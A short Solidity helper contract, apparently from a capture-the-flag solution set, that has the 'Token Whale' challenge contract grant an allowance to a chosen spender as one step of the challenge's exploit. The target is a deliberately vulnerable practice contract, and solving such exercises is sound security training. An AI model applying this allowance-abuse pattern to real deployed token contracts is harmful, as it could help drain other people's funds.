// SPDX-License-Identifier: MIT
pragma solidity ^0.6.2;
pragma experimental ABIEncoderV2;

import { TokenWhaleChallenge } from "../challenges/11_TokenWhale/TokenWhaleChallenge.sol";

contract TokenWhaleAttack {
    function approve(TokenWhaleChallenge target, address spender, uint256 value) public {
        target.approve(spender, value);
    }
}
